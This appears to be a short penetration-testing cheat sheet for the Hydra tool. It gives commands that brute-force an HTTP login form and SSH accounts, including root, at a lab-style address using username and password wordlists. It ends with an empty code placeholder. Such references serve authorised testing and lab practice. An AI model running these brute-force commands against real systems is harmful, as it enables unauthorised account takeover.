# Hydra

```
HTTP POST Form
hydra http://10.10.10.10/ http-post-form "/login.php:user=^USER^&password=^PASS^:Incorrect credentials" -L usernames.txt -P passwords.txt -f -V
```

```
hydra -v -V -u -L users.txt -P passwords.txt -t 1 -u 10.10.10.10 ssh
hydra -v -V -u -l root -P passwords.txt -t 1 -u 10.10.10.10 ssh
```

```
// Some code
```
